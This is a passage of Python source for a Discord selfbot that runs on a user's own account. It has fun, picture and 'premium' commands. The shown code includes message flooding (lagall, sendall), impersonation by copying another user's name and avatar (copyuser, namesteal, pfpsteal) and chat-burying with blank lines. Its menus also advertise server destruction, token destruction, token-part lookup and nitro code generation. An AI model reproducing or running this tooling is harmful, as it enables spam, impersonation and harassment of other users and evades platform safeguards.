        async def text(ctx, category=None):
            if category is None:
                embed.set_thumbnail(url=Tokon.thumbnail)
                content = on_theme(f"""```{Tokon.theme}
[ <> is required  |  » is informations ]
```
```{Tokon.theme}
[{Tokon.author}]


[del <msg>]             » send a message and delete it instantly
[speak1337]             » talk like a gamer
[minesweeper]           » play a game of minesweeper
[spam <amount> <msg>]   » spam a message
[purge <amount>]        » purge the amount of messages
[dm <user> <msg>]       » Dm a user a message
[reverse <msg>]         » send the message in reverse-order
[shrug]                 » ¯\_(ツ)_/¯
[lenny]                 » ( ͡° ͜ʖ ͡°)
[flip]                  » (╯°□°）╯︵ ┻━┻
[unflip]                » ┬─┬ ノ( ゜-゜ノ)
[bold <msg>]            » bold the message
[spoil <msg>]           » Add a spoiler to the message
[underline <msg>]       » underline the message
[italic <msg>]          » italicize the message
[wave <msg>]            » add waves to the message
[greyembed <msg>]       » greyembed the message
[onelayer <msg>]        » add 1 ` to the message
[twolayer <msg>]        » add 2 ` to the message
[threelayer <msg>]      » add 3 ` to the message
[empty]                 » send empty message
[firstmsg]              » show 1st message
[ascii <msg>]           » send the message in ASCII art


[{Tokon.footer}]
```""")
                await ctx.message.delete()
                await ctx.send(content=content)

        @Tokon.command()
        async def fun(ctx, category=None):
            if category is None:
                embed = discord.Embed(color=0x0E0E0E)
                embed.set_author(name="Universe",
                                 icon_url="")
                embed.set_image(url=Tokon.thumbnail)
                embed.set_footer(text=f"{Tokon.footer}")
                embed.set_thumbnail(url=Tokon.thumbnail)
                embed.description = f"`FUN COMMANDS`\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> etherium` - shows the current etherium exchange rate\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> feed <user>` - feeds the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> - cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic"
                await ctx.message.edit(content='ﾠﾠ' + '\n' * 1 + 'ﾠﾠ')
                await ctx.message.edit(embed=embed)

        @Tokon.command()
        async def picture(ctx, category=None):
            if category is None:
                embed = discord.Embed(color=0x0E0E0E)
                embed.set_author(name="Universe", icon_url="")
                embed.set_image(url=Tokon.thumbnail)
                embed.set_footer(text=f"{Tokon.footer}")
                embed.set_thumbnail(url=Tokon.thumbnail)
                embed.description = f"`PICTURE MANIPULATION COMMANDS`\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blurpify <user>` - blurpifies the specified user"
                await ctx.message.edit(content='ﾠﾠ' + '\n' * 1 + 'ﾠﾠ')
                await ctx.message.edit(embed=embed)

        @Tokon.command()
        async def premium(ctx, category=None):
            if category is None:
                embed = discord.Embed(color=0x0E0E0E)
                embed.set_author(name="Universe",
                                 icon_url="")
                embed.set_image(url=Tokon.thumbnail)
                embed.set_footer(text=f"{Tokon.footer}")
                embed.set_thumbnail(url=Tokon.thumbnail)
                embed.description = f"`Premium Commands`\n`> rp` - repeat the last command\n`> blockmsg <iduser> <message>` - send to a blocked user a message\n`> userpfp <user>` - returns the user's pfp\n`> copyuser <user>` - steal pfp,name\n`> namesteal <user>` - steal name\n`> read` - read all notifications\n`> rainbow <role>` - rainbowify a role existing\n`> pfpsteal <user>` - rob the pfp of seomeone\n`> kill` - destroy server\n`> massreact <emoji>` - mass reacts with the specified emoji\n`> hack <user>` - hacking user \n`> lagall <amount> <message>` - spam laggy message\n`> automessage <user>` - automessage users messages ({Tokon.automessage})\n`> unautomessage` - stop automessage\n`> silentmute <user>` - mute user in silent method\n`> unsilentmute` - stop silentmute \n`> mute <user>` - mute users messages\n`> unmute` - stop mute \n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> tokenfuck <token>` - destroy a token\n`> clear` - clear the chat of discord\n`> nitro` - generates a random nitro code\n`> ano <message>` - talk anonymously"
                await ctx.message.edit(content='ﾠﾠ' + '\n' * 1 + 'ﾠﾠ')
                await ctx.message.edit(embed=embed)

        @Tokon.command()
        async def bypass(ctx, category=None):
            if category is None:
                embed = discord.Embed(color=0x0E0E0E)
                embed.set_author(name="Universe",
                                 icon_url="")
                embed.set_image(url=Tokon.thumbnail)
                embed.set_footer(text=f"{Tokon.footer}")
                embed.set_thumbnail(url=Tokon.thumbnail)
                embed.description = f"`Premium Commands`\n`> blockmsg <iduser> <message> {PremiumOnly}` - send to a blocked user a message\n`> linkvertise <link> {PremiumOnly}` - bypass linkvertise link\n`> ano <message> {PremiumOnly}` - talk anonymously"
                await ctx.message.edit(content='ﾠﾠ' + '\n' * 1 + 'ﾠﾠ')
                await ctx.message.edit(embed=embed)
                
        @Tokon.command()
        async def admin(ctx, category=None):
            if category is None:
                embed = discord.Embed(color=0x0E0E0E)
                embed.set_author(name="Universe", icon_url="")
                embed.set_image(url=Tokon.thumbnail)
                embed.set_footer(text=f"{Tokon.footer}")
                embed.set_thumbnail(url=Tokon.thumbnail)
                description = f"""```
{Tokon.command_prefix}adminservers  » list servers u have perm
                                ```"""
                embed.description = f"{description}"
                await ctx.message.edit(content='ﾠﾠ' + '\n' * 1 + 'ﾠﾠ')
                await ctx.message.edit(embed=embed)

        @Tokon.command()
        async def image(ctx, *, args):
            await ctx.message.delete()
            url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
            page = requests.get(url)
            soup = bs4(page.text, 'html.parser')
            image_tags = soup.findAll('img')
            if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
                link = image_tags[2]['src']
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(link) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(f"Search result for: **{args}**",
                                       file=discord.File(file, f"Tokon_anal.png"))
                except:
                    await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
            else:
                await ctx.send("Nothing found for **" + args + "**")

        @Tokon.command()
        async def stealemoji(ctx):
            await ctx.message.delete()
            custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
            unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"

        @Tokon.command()
        async def hack(ctx, user):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                number123 = ["1", "2", "3"]
                randomMoneyBTC = "".join(random.choices(number123))
                dong = ""
                message = await ctx.send(f"**[0.00%] Hacking** {user}")
                time.sleep(3)
                await message.edit(content=f"**[5.97%] Finding discord login... (2fa bypassed) ** {user}")
                time.sleep(5)
                await message.edit(content=f"**[26.34%] Finding cookies... ** {user}")
                time.sleep(2)
                await message.edit(content=f"**[59.72%] Taking Ip Address... ** {user}")
                time.sleep(4)
                await message.edit(content=f"**[83.11%] Connecting To Webcam... ** {user}")
                time.sleep(1.5)
                await message.edit(content=f"**[98.06%] Sell Data To Darkweb... ** {user}")
                time.sleep(3)
                await message.edit(
                    content=f"**[100.00%]** {user} **has been hacked | Bitcoin You Get : {randomMoneyBTC}**")
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def lagall(ctx, amount: int):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for _i in range(amount):
                    await ctx.send(
                        ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def stop(ctx):
            voice = discord.utils.get(Tokon.voice_clients, guild=ctx.guild)
            voice.stop()

        @Tokon.command()
        async def copyuser(ctx, user: discord.User):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                password = input('Enter Password : ')
                with open('St/e1/Scookie/pfpsteal.png', 'wb') as f:
                    r = requests.get(user.avatar_url, stream=True)
                    for block in r.iter_content(1024):
                        if not block:
                            break
                        f.write(block)
                try:
                    Image.open('St/e1/Scookie/pfpsteal.png').convert('RGB')
                    with open('St/e1/Scookie/pfpsteal.png', 'rb') as f:
                        await Tokon.user.edit(password=password, avatar=f.read(), username=f"{user.name}")
                except discord.HTTPException as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def pfpsteal(ctx, user: discord.User):
            if idlog == premium_saveid and premium_status == "exact":
                password = input(f'{TokonInput}Enter Password : ')
                with open('St/e1/Scookie/pfpsteal.png', 'wb') as f:
                    r = requests.get(user.avatar_url, stream=True)
                    for block in r.iter_content(1024):
                        if not block:
                            break
                        f.write(block)
                try:
                    Image.open('St/e1/Scookie/pfpsteal.png').convert('RGB')
                    with open('St/e1/Scookie/pfpsteal.png', 'rb') as f:
                        await Tokon.user.edit(password=password, avatar=f.read())
                except discord.HTTPException as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def namesteal(ctx, user: discord.User):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                password = input(f'{TokonInput}Enter Password : ')
                await Tokon.user.edit(password=password, username=f"{user.name}")
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def ano(ctx, *, _message):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
                await ctx.send(_message)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def unmute(ctx, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    await ctx.send("Now unmuted " + str(Tokon.mute))
                    Tokon.mute = None
            else:
                await ctx.send('***Premium Invalid***')
                    
        @Tokon.command()
        async def mute(ctx, user: discord.User, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    if not Tokon.mute == user:
                        Tokon.mute = user
                        await ctx.send("Now muted " + str(Tokon.mute))
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def unsilentmute(ctx, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    await ctx.send("Now unmuted " + str(Tokon.silentmute))
                    Tokon.silentmute = None
            else:
                await ctx.send('***Premium Invalid***')
                    
        @Tokon.command()
        async def silentmute(ctx, user: discord.User, category=None):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if category == None:
                    if not Tokon.silentmute == user:
                        Tokon.silentmute = user
                        await ctx.send("Now muted " + str(Tokon.silentmute))
            else:
                await ctx.send('***Premium Invalid***')
                    

        @Tokon.command()
        async def unautomessage(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                if Tokon.user is None:
                    await ctx.send("You weren't automessage anyone to begin with")
                    return
                await ctx.send("Unautomessage " + str(Tokon.automessage))
                Tokon.automessage = None
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def automessage(ctx, user: discord.User):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                Tokon.automessage = user
                await ctx.send("Now automessage on " + str(Tokon.automessage))
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def clear(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def sendall(ctx, *, message):
            await ctx.message.delete()
            try:
                channels = ctx.guild.text_channels
                for channel in channels:
                    await channel.send(message)
            except:
                pass

        @Tokon.command()
        async def genname(ctx):
            await ctx.message.delete()
            first, second = random.choices(ctx.guild.members, k=2)
            first = first.display_name[len(first.display_name) // 2:]
            second = second.display_name[:len(second.display_name) // 2]
            await ctx.send(discord.utils.escape_mentions(second + first))

        @Tokon.command()
        async def pingweb(ctx, website=None):
            await ctx.message.delete()
            if website is None:
                pass
            else:
                try:
                    r = requests.get(website).status_code
                except Exception as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                if r == 404:
                    await ctx.send(f'Website is down ({r})', delete_after=3)
                else:
                    await ctx.send(f'Website is operational ({r})', delete_after=3)

        @Tokon.command()
        async def tweet(ctx, username: str = None, *, message: str = None):
            await ctx.message.delete()
            if username is None or message is None:
                await ctx.send("missing parameters")
                return
            async with aiohttp.ClientSession() as cs:
                async with cs.get(
                        f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
                    res = await r.json()
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(str(res['message'])) as resp:
                                image = await resp.read()
                        with io.BytesIO(image) as file:
                            await ctx.send(file=discord.File(file, f"Tokon_tweet.png"))
                    except:
                        await ctx.send(res['message'])

        @Tokon.command()
        async def magik(ctx, user: discord.User = None):
            await ctx.message.delete()
            endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
            if user is None:
                avatar = str(ctx.author.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon_magik.png"))
                except:
                    await ctx.send(res['message'])
            else:
                avatar = str(user.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon_magik.png"))
                except:
                    await ctx.send(res['message'])

        @Tokon.command()
        async def read(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for guild in Tokon.guilds:
                    await guild.ack()
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def fry(ctx, user: discord.User = None):
            await ctx.message.delete()
            endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
            if user is None:
                avatar = str(ctx.author.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon_fry.png"))
                except:
                    await ctx.send(res['message'])
            else:
                avatar = str(user.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon_fry.png"))
                except:
                    await ctx.send(res['message'])

        @Tokon.command()
        async def blurpify(ctx, user: discord.User = None):
            await ctx.message.delete()
            endpoint = "https://nekobot.xyz/api/imagegen?type=blurpify&image="
            if user is None:
                avatar = str(ctx.author.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon_blurpify.png"))
                except:
                    await ctx.send(res['message'])
            else:
                avatar = str(user.avatar_url_as(format="png"))
                endpoint += avatar
                r = requests.get(endpoint)
                res = r.json()
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(str(res['message'])) as resp:
                            image = await resp.read()
                    with io.BytesIO(image) as file:
                        await ctx.send(file=discord.File(file, f"Tokon_blurpify.png"))
                except:
                    await ctx.send(res['message'])

        @Tokon.command()
        async def token(ctx, user: discord.User = None):
            await ctx.message.delete()
            list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
                    "U",
                    "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                    'ñ',
                    'o',
                    'p', 'q', 'r', 's', 't', 'u',
                    'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
            token = random.choices(list, k=59)
            print(token)
            if user is None:
                user = ctx.author
                await ctx.send(user.mention + "'s token is " + ''.join(token))
            else:
                await ctx.send(user.mention + "'s token is " + "".join(token))

        @Tokon.command()
        async def userpfp(ctx, *, user: discord.User = None):
            await ctx.message.delete()
            format = "gif"
            user = user or ctx.author
            if user.is_avatar_animated() != True:
                format = "png"
            avatar = user.avatar_url_as(format=format if format != "gif" else None)
            async with aiohttp.ClientSession() as session:
                async with session.get(str(avatar)) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"Avatar.{format}"))

        @Tokon.command()
        async def userinfo(ctx, *, user: discord.User = None):
            await ctx.message.delete()
            if user is None:
                user = ctx.author
            premiumvalue = "no"
            if premium_status == "exact":
                premiumvalue = "yes"
            date_format = "%a, %d %b %Y %I:%M %p"
            def encodebase64(message):
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                base64_message = base64_bytes.decode('ascii')
                message = base64_message
                return message
            id_1part = encodebase64(str(user.id))
            content = f"""```ini\n
            
[] 
[Registered] 
[ID] 
            """
            content = on_theme(f"""```{Tokon.theme}
[{Tokon.author}]


[Premium]          » {premiumvalue}
[Registered]       » {user.created_at.strftime(date_format)}
[ID]               » {str(user.id)}
[First Part Token] » {id_1part}
[Username]         » {user.name}
[Hashtag]          » {user.discriminator}


[{Tokon.footer}]
```""" + user.mention)
            await ctx.send(content=content)

        @Tokon.command()
        async def quickdelete(ctx, *, args):
            await ctx.message.delete()
            await ctx.send(args, delete_after=1)

        @Tokon.command()
        async def minesweeper(ctx, size: int = 5):
            await ctx.message.delete()
            size = max(min(size, 8), 2)
            bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
            is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
            has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
            message = "**Click to play**:\n"
            for y in range(size):
                for x in range(size):
                    tile = "||{}||".format(chr(11036))
                    if has_bomb(x, y):
                        tile = "||{}||".format(chr(128163))
                    else:
                        count = 0
                        for xmod, ymod in m_offets:
                            if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                                count += 1
                        if count != 0:
                            tile = "||{}||".format(m_numbers[count - 1])
                    message += tile
                message += "\n"
            await ctx.send(message)

        @Tokon.command()
        async def speak1337(ctx, *, text):
            await ctx.message.delete()
            text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
                .replace('E', '3').replace('i', '!').replace('I', '!') \
                .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
            await ctx.send(f'{text}')

        @Tokon.command()
        async def ghost(ctx):
            await ctx.message.delete()
            password = input(f'{TokonInput}Enter Password : ')
            with open('St/e1/Scookie/Transparent.png', 'rb') as f:
                try:
                    await Tokon.user.edit(password=password, username="᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼", avatar=f.read())
                except discord.HTTPException as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)

        @Tokon.command()
        async def setpfp(ctx, *, url):
            await ctx.message.delete()
            password = input(f'{TokonInput}Enter Password : ')
            with open('St/e1/Scookie/PFP-1.png', 'wb') as f:
                r = requests.get(url, stream=True)
                for block in r.iter_content(1024):
                    if not block:
                        break
                    f.write(block)
            try:
                Image.open('St/e1/Scookie/PFP-1.png').convert('RGB')
                with open('St/e1/Scookie/PFP-1.png', 'rb') as f:
                    await Tokon.user.edit(password=password, avatar=f.read())
            except discord.HTTPException as e:
                TokonPrint(e)

        @Tokon.command()
        async def wyr(ctx):
            await ctx.message.delete()
            r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
            soup = bs4(r, 'html.parser')
            qa = soup.find(id='qa').text
            qb = soup.find(id='qb').text
            message = await ctx.send(f"{qa}\nor\n{qb}")
            await message.add_reaction("🅰")
            await message.add_reaction("🅱")

        @Tokon.command()
        async def topic(ctx):
            await ctx.message.delete()
